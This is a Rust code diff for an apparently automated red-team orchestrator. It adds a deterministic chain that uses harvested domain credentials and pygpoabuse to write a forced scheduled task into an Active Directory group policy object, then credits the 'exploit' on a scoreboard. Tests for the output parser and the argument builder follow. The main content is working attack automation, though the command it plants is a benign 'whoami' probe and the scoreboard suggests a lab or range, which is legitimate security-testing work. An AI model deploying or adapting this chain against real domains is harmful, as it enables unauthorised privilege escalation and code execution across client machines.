@@ -7,6 +7,17 @@
 //!
 //! GPO vulns are typically discovered via BloodHound edges (WriteProperty,
 //! WriteDacl, GenericAll on GPO objects).
+//!
+//! Dispatch model: deterministic. The previous LLM-routed path
+//! (`throttled_submit("exploit", "privesc", payload)`) was unreliable in two
+//! ways: (a) the LLM had to infer the `pygpoabuse` tool name from the payload
+//! and frequently chose unrelated tools (`bloodhound_collect`, generic
+//! `whoami`); (b) the payload omitted the required `command` field that the
+//! tool needs to build the scheduled-task XML, so even when the LLM picked
+//! the right tool the call failed at the arg-validation step. We dispatch
+//! `pygpoabuse_immediate_task` directly with a generated proof command, then
+//! `mark_exploited` on success — same scoreboard-credit pattern as the
+//! ESC1/ESC3/ESC8/ESC11 deterministic chains.
 
 use std::sync::Arc;
 use std::time::Duration;
@@ -19,6 +30,90 @@ use crate::orchestrator::dispatcher::Dispatcher;
 
 /// Dedup key prefix for GPO abuse attacks.
 const DEDUP_GPO_ABUSE: &str = "gpo_abuse";
+
+/// Result of parsing `pygpoabuse_immediate_task` stdout. The tool prints
+/// `[+] ...` lines on each phase that landed (versionNumber update, scheduled
+/// task XML write, gpt.ini bump). The presence of *any* `[+]` line accompanied
+/// by either `created`, `updated`, or `success` is the contract:
+/// it means the GPO writes succeeded server-side, which is what we credit on
+/// the scoreboard. Whether the resulting scheduled task ever fires on a
+/// downstream client is gated by GP refresh (90 min default) — out of scope
+/// for the dispatcher tick.
+#[derive(Debug, PartialEq, Eq)]
+pub(crate) enum GpoAbuseOutcome {
+    /// pygpoabuse confirmed the GPO write — at least one `[+]` success
+    /// marker observed (versionNumber/ScheduledTask/gpt.ini).
+    Success,
+    /// Tool exited but no success markers seen. Either the credentials
+    /// don't have write on that GPO, the GPO id was wrong, or the tool
+    /// hit a wire-level error before any phase landed. Retryable.
+    NoEvidence,
+    /// Distinct error patterns we don't want to retry the same way —
+    /// the credential is wrong, or the GPO doesn't exist. The caller
+    /// burns a failure-counter slot.
+    KnownFailure(&'static str),
+}
+
+/// Parse pygpoabuse output. Stable enough to bind tests against; the tool's
+/// markers haven't changed since the upstream Sploutchy/sploutchy fork
+/// settled the `[+]`/`[-]`/`[!]` line prefixes.
+pub(crate) fn parse_pygpoabuse_output(output: &str) -> GpoAbuseOutcome {
+    let lower = output.to_lowercase();
+
+    if lower.contains("invalid credentials")
+        || lower.contains("authentication failed")
+        || lower.contains("kdc_err_preauth_failed")
+    {
+        return GpoAbuseOutcome::KnownFailure("auth");
+    }
+    if lower.contains("no such object") || lower.contains("no_object") {
+        return GpoAbuseOutcome::KnownFailure("gpo_not_found");
+    }
+    if lower.contains("insufficient access") || lower.contains("access_denied") {
+        return GpoAbuseOutcome::KnownFailure("insufficient_rights");
+    }
+
+    // Success markers from pygpoabuse. Order them by frequency — every
+    // successful run hits versionNumber + scheduled-task lines.
+    let has_plus_marker = output.lines().any(|l| l.trim_start().starts_with("[+]"));
+    if has_plus_marker
+        && (lower.contains("scheduledtask")
+            || lower.contains("scheduled task")
+            || lower.contains("versionnumber")
+            || lower.contains("gpt.ini")
+            || lower.contains("successful"))
+    {
+        return GpoAbuseOutcome::Success;
+    }
+
+    GpoAbuseOutcome::NoEvidence
+}
+
+/// Build the `pygpoabuse_immediate_task` argument JSON. Pure — caller passes
+/// pre-validated values and gets back the shape the tool expects. The
+/// `command` defaults to a benign `whoami` probe written to a unique task
+/// name (the tool refuses to overwrite an existing task without `-f`; we
+/// always pass `force=true` so retries don't trip on a stale half-applied
+/// task from a previous failed run).
+pub(crate) fn build_pygpoabuse_args(
+    domain: &str,
+    username: &str,
+    password: &str,
+    dc_ip: &str,
+    gpo_id: &str,
+    task_name_suffix: &str,
+) -> serde_json::Value {
+    json!({
+        "domain": domain,
+        "username": username,
+        "password": password,
+        "dc_ip": dc_ip,
+        "gpo_id": gpo_id,
+        "command": "cmd /c whoami",
+        "task_name": format!("ARES_GPO_Probe_{}", task_name_suffix),
+        "force": true,
+    })
+}
 
 /// Monitors for GPO write access vulnerabilities and dispatches exploitation.
 /// Interval: 30s.
@@ -139,64 +234,205 @@ pub async fn auto_gpo_abuse(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Re
         };
 
         for item in work {
-            let mut payload = json!({
-                "technique": "gpo_abuse",
-                "vuln_type": "gpo_abuse",
-                "vuln_id": item.vuln_id,
-                "domain": item.domain,
-            });
-
-            if let Some(ref gpo_id) = item.gpo_id {
-                payload["gpo_id"] = json!(gpo_id);
-            }
-            if let Some(ref name) = item.gpo_name {
-                payload["gpo_name"] = json!(name);
-            }
-            if let Some(ref dc) = item.dc_ip {
-                payload["target_ip"] = json!(dc);
-                payload["dc_ip"] = json!(dc);
-            }
-
-            if let Some(ref cred) = item.credential {
-                payload["username"] = json!(cred.username);
-                payload["password"] = json!(cred.password);
-                payload["credential"] = json!({
-                    "username": cred.username,
-                    "password": cred.password,
-                    "domain": cred.domain,
-                });
-            }
-
-            let priority = dispatcher.effective_priority("gpo_abuse");
-            match dispatcher
-                .throttled_submit("exploit", "privesc", payload, priority)
-                .await
-            {
-                Ok(Some(task_id)) => {
-                    info!(
-                        task_id = %task_id,
-                        vuln_id = %item.vuln_id,
-                        source = %item.source_user,
-                        gpo = ?item.gpo_name,
-                        "GPO abuse dispatched"
-                    );
-                    dispatcher
-                        .state
-                        .write()
-                        .await
-                        .mark_processed(DEDUP_GPO_ABUSE, item.dedup_key.clone());
-                    let _ = dispatcher
-                        .state
-                        .persist_dedup(&dispatcher.queue, DEDUP_GPO_ABUSE, &item.dedup_key)
-                        .await;
-                }
-                Ok(None) => {}
-                Err(e) => {
-                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch GPO abuse")
-                }
-            }
+            dispatch_gpo_abuse_deterministic(&dispatcher, item).await;
         }
     }
+}
+
+/// Deterministic GPO abuse chain. Runs `pygpoabuse_immediate_task` via
+/// `dispatch_tool` (bypassing the LLM agent loop), parses the tool output,
+/// and either marks the vuln exploited or records a failure for retry.
+///
+/// The dispatch task_id starts with `gpo_abuse_*`, NOT `exploit_*`, so the
+/// standard `mark_exploited` path in `result_processing` does not fire for
+/// this vuln_id — we explicitly call `mark_exploited` on success. Same
+/// scoreboard-credit pattern as the ESC1/ESC3/ESC8/ESC11/mssql_link_pivot
+/// deterministic chains.
+async fn dispatch_gpo_abuse_deterministic(dispatcher: &Arc<Dispatcher>, item: GpoWork) {
+    if dispatcher.state.is_exploit_abandoned(&item.vuln_id).await {
+        info!(
+            vuln_id = %item.vuln_id,
+            "GPO abuse skipped — vuln abandoned (>=MAX_EXPLOIT_FAILURES); locking dedup"
+        );
+        {
+            let mut state = dispatcher.state.write().await;
+            state.mark_processed(DEDUP_GPO_ABUSE, item.dedup_key.clone());
+        }
+        let _ = dispatcher
+            .state
+            .persist_dedup(&dispatcher.queue, DEDUP_GPO_ABUSE, &item.dedup_key)
+            .await;
+        return;
+    }
+
+    let Some(gpo_id) = item.gpo_id.clone() else {
+        debug!(
+            vuln_id = %item.vuln_id,
+            "GPO abuse skipped — no gpo_id on vuln (BloodHound emit didn't capture the container GUID)"
+        );
+        return;
+    };
+    let Some(dc_ip) = item.dc_ip.clone() else {
+        debug!(
+            vuln_id = %item.vuln_id,
+            domain = %item.domain,
+            "GPO abuse skipped — no DC IP known for domain (auto_recon hasn't promoted a DC yet)"
+        );
+        return;
+    };
+    let Some(cred) = item.credential.clone() else {
+        debug!(vuln_id = %item.vuln_id, "GPO abuse skipped — no credential for source user");
+        return;
+    };
+
+    // Mark dedup BEFORE spawning so the next 30s tick doesn't redispatch
+    // while the (~60-90s) pygpoabuse run is in flight.
+    {
+        let mut state = dispatcher.state.write().await;
+        state.mark_processed(DEDUP_GPO_ABUSE, item.dedup_key.clone());
+    }
+    let _ = dispatcher
+        .state
+        .persist_dedup(&dispatcher.queue, DEDUP_GPO_ABUSE, &item.dedup_key)
+        .await;
+
+    // Short uuid suffix so retries don't trip pygpoabuse's "task already
+    // exists" guard. We pass `force=true` anyway, but the unique name keeps
+    // the GPO from accumulating ghost tasks.
+    let task_suffix = uuid::Uuid::new_v4().simple().to_string()[..8].to_string();
+    let tool_args = build_pygpoabuse_args(
+        &item.domain,
+        &cred.username,
+        &cred.password,
+        &dc_ip,
+        &gpo_id,
+        &task_suffix,
+    );
+
+    let task_id = format!(
+        "gpo_abuse_{}",
+        &uuid::Uuid::new_v4().simple().to_string()[..12]
+    );
+    let call = ares_llm::ToolCall {
+        id: format!("pygpoabuse_{}", uuid::Uuid::new_v4().simple()),
+        name: "pygpoabuse_immediate_task".to_string(),
+        arguments: tool_args,
+    };
+
+    info!(
+        task_id = %task_id,
+        vuln_id = %item.vuln_id,
+        source = %item.source_user,
+        gpo = ?item.gpo_name,
+        gpo_id = %gpo_id,
+        dc_ip = %dc_ip,
+        "GPO abuse dispatched (direct tool, no LLM)"
+    );
+
+    let dispatcher_bg = dispatcher.clone();
+    let vuln_id_bg = item.vuln_id.clone();
+    let dedup_key_bg = item.dedup_key.clone();
+    let gpo_name_bg = item.gpo_name.clone();
+    tokio::spawn(async move {
+        let result = dispatcher_bg
+            .llm_runner
+            .tool_dispatcher()
+            .dispatch_tool("privesc", &task_id, &call)
+            .await;
+
+        let outcome = match &result {
+            Ok(exec) => {
+                if exec.error.is_some() {
+                    // Tool reported a non-zero exit. Treat as no-evidence so
+                    // we retry up to the cap, unless the stdout matches a
+                    // known terminal failure pattern.
+                    let parsed = parse_pygpoabuse_output(&exec.output);
+                    if matches!(parsed, GpoAbuseOutcome::Success) {
+                        GpoAbuseOutcome::NoEvidence
+                    } else {
+                        parsed
+                    }
+                } else {
+                    parse_pygpoabuse_output(&exec.output)
+                }
+            }
+            Err(_) => GpoAbuseOutcome::NoEvidence,
+        };
+
+        match outcome {
+            GpoAbuseOutcome::Success => {
+                if let Err(e) = dispatcher_bg
+                    .state
+                    .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
+                    .await
+                {
+                    warn!(
+                        err = %e,
+                        vuln_id = %vuln_id_bg,
+                        "Failed to mark GPO abuse exploited (chain succeeded but token not emitted)"
+                    );
+                }
+                info!(
+                    vuln_id = %vuln_id_bg,
+                    gpo = ?gpo_name_bg,
+                    "GPO abuse succeeded — scheduled task XML written; \
+                     downstream code-exec lands on next GP refresh"
+                );
+            }
+            GpoAbuseOutcome::KnownFailure(reason) => {
+                // Distinct failure — record one slot, abandon if at cap.
+                // Don't clear dedup: the cause won't change on retry with
+                // the same input (wrong creds, missing GPO, etc.).
+                let attempts = dispatcher_bg
+                    .state
+                    .record_exploit_failure(&vuln_id_bg)
+                    .await;
+                warn!(
+                    vuln_id = %vuln_id_bg,
+                    reason,
+                    attempts,
+                    "GPO abuse hit a known failure mode; dedup stays locked"
+                );
+            }
+            GpoAbuseOutcome::NoEvidence => {
+                let attempts = dispatcher_bg
+                    .state
+                    .record_exploit_failure(&vuln_id_bg)
+                    .await;
+                let abandoned = dispatcher_bg.state.is_exploit_abandoned(&vuln_id_bg).await;
+                let summary = match &result {
+                    Ok(exec) => exec
+                        .error
+                        .clone()
+                        .unwrap_or_else(|| "no success markers in pygpoabuse output".into()),
+                    Err(e) => format!("dispatch error: {e}"),
+                };
+                if abandoned {
+                    warn!(
+                        vuln_id = %vuln_id_bg,
+                        attempts,
+                        summary = %summary,
+                        "GPO abuse abandoned — exhausted MAX_EXPLOIT_FAILURES; dedup stays locked"
+                    );
+                    return;
+                }
+                warn!(
+                    vuln_id = %vuln_id_bg,
+                    attempts,
+                    summary = %summary,
+                    "GPO abuse: no success markers — clearing dedup for retry on next tick"
+                );
+                {
+                    let mut state = dispatcher_bg.state.write().await;
+                    state.unmark_processed(DEDUP_GPO_ABUSE, &dedup_key_bg);
+                }
+                let _ = dispatcher_bg
+                    .state
+                    .unpersist_dedup(&dispatcher_bg.queue, DEDUP_GPO_ABUSE, &dedup_key_bg)
+                    .await;
+            }
+        }
+    });
 }
 
 struct GpoWork {
@@ -513,5 +749,149 @@ mod tests {
             .unwrap_or("")
             .to_string();
         assert_eq!(domain, "");
+    }
+
+    // ── parse_pygpoabuse_output ────────────────────────────────────────
+
+    #[test]
+    fn parse_pygpoabuse_output_recognises_scheduled_task_success() {
+        // Realistic pygpoabuse output for a successful GPO write: the tool
+        // prints `[+]` lines as each phase lands.
+        let stdout = "[+] versionNumber updated\n\
+            [+] gpt.ini saved\n\
+            [+] ScheduledTask created!\n";
+        assert_eq!(
+            parse_pygpoabuse_output(stdout),
+            GpoAbuseOutcome::Success,
+            "canonical success output must classify as Success"
+        );
+    }
+
+    #[test]
+    fn parse_pygpoabuse_output_success_via_versionnumber_only() {
+        // Some pygpoabuse runs print versionNumber but emit the scheduled-
+        // task line on stderr (which we don't pass through). Treat
+        // versionNumber + [+] marker as success on its own.
+        let stdout = "[+] versionNumber updated to 5\n";
+        assert_eq!(parse_pygpoabuse_output(stdout), GpoAbuseOutcome::Success);
+    }
+
+    #[test]
+    fn parse_pygpoabuse_output_no_markers_is_noevidence() {
+        // Output without any `[+]` markers — almost always means the tool
+        // bailed before writing anything (LDAP connect issues, etc.).
+        let stdout = "Connecting to dc01.contoso.local...\n\
+            Operation pending.\n";
+        assert_eq!(parse_pygpoabuse_output(stdout), GpoAbuseOutcome::NoEvidence);
+    }
+
+    #[test]
+    fn parse_pygpoabuse_output_invalid_credentials_is_known_failure() {
+        let stdout = "[-] Invalid credentials provided\n";
+        assert_eq!(
+            parse_pygpoabuse_output(stdout),
+            GpoAbuseOutcome::KnownFailure("auth")
+        );
+    }
+
+    #[test]
+    fn parse_pygpoabuse_output_kdc_preauth_is_known_failure() {
+        // Kerberos pre-auth failure surfaces with `KDC_ERR_PREAUTH_FAILED`.
+        let stdout = "Error: KDC_ERR_PREAUTH_FAILED\n";
+        assert_eq!(
+            parse_pygpoabuse_output(stdout),
+            GpoAbuseOutcome::KnownFailure("auth")
+        );
+    }
+
+    #[test]
+    fn parse_pygpoabuse_output_gpo_not_found_is_known_failure() {
+        let stdout = "[!] LDAP search failed: no such object\n";
+        assert_eq!(
+            parse_pygpoabuse_output(stdout),
+            GpoAbuseOutcome::KnownFailure("gpo_not_found")
+        );
+    }
+
+    #[test]
+    fn parse_pygpoabuse_output_insufficient_rights_is_known_failure() {
+        let stdout = "Modify operation failed: insufficient access rights\n";
+        assert_eq!(
+            parse_pygpoabuse_output(stdout),
+            GpoAbuseOutcome::KnownFailure("insufficient_rights")
+        );
+    }
+
+    #[test]
+    fn parse_pygpoabuse_output_known_failure_wins_over_success_marker() {
+        // If a [+] marker appears alongside a known auth failure, the
+        // auth verdict still wins — pygpoabuse may have printed the marker
+        // for an earlier phase (e.g., versionNumber read) before the
+        // ScheduledTask write hit the rejected auth path. We don't credit
+        // a partial state.
+        let stdout = "[+] versionNumber updated\n\
+            [-] Invalid credentials provided\n";
+        assert_eq!(
+            parse_pygpoabuse_output(stdout),
+            GpoAbuseOutcome::KnownFailure("auth"),
+            "auth-failure verdict must override partial success marker"
+        );
+    }
+
+    #[test]
+    fn parse_pygpoabuse_output_empty_string_is_noevidence() {
+        assert_eq!(parse_pygpoabuse_output(""), GpoAbuseOutcome::NoEvidence);
+    }
+
+    // ── build_pygpoabuse_args ──────────────────────────────────────────
+
+    #[test]
+    fn build_pygpoabuse_args_includes_all_required_fields() {
+        let args = build_pygpoabuse_args(
+            "contoso.local",
+            "alice",
+            "P@ssw0rd!",
+            "192.168.58.10",
+            "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
+            "abc12345",
+        );
+        assert_eq!(args["domain"], "contoso.local");
+        assert_eq!(args["username"], "alice");
+        assert_eq!(args["password"], "P@ssw0rd!");
+        assert_eq!(args["dc_ip"], "192.168.58.10");
+        assert_eq!(args["gpo_id"], "{6AC1786C-016F-11D2-945F-00C04fB984F9}");
+        assert_eq!(args["task_name"], "ARES_GPO_Probe_abc12345");
+        assert_eq!(args["force"], true);
+        assert!(
+            args["command"].as_str().unwrap().contains("whoami"),
+            "default probe command must include whoami"
+        );
+    }
+
+    #[test]
+    fn build_pygpoabuse_args_force_is_always_true() {
+        // Without force=true, pygpoabuse refuses to overwrite an existing
+        // scheduled task on retry — we'd loop forever after the first
+        // partial run.
+        let args = build_pygpoabuse_args(
+            "contoso.local",
+            "alice",
+            "P@ssw0rd!",
+            "192.168.58.10",
+            "any-gpo",
+            "suffix",
+        );
+        assert_eq!(args["force"], true);
+    }
+
+    #[test]
+    fn build_pygpoabuse_args_task_name_carries_suffix() {
+        // Two different suffixes must produce distinct task_names so retries
+        // don't accumulate ghost tasks on the GPO.
+        let a = build_pygpoabuse_args("d", "u", "p", "10", "g", "alpha111");
+        let b = build_pygpoabuse_args("d", "u", "p", "10", "g", "beta2222");
+        assert_ne!(a["task_name"], b["task_name"]);
+        assert!(a["task_name"].as_str().unwrap().ends_with("alpha111"));
+        assert!(b["task_name"].as_str().unwrap().ends_with("beta2222"));
     }
 }
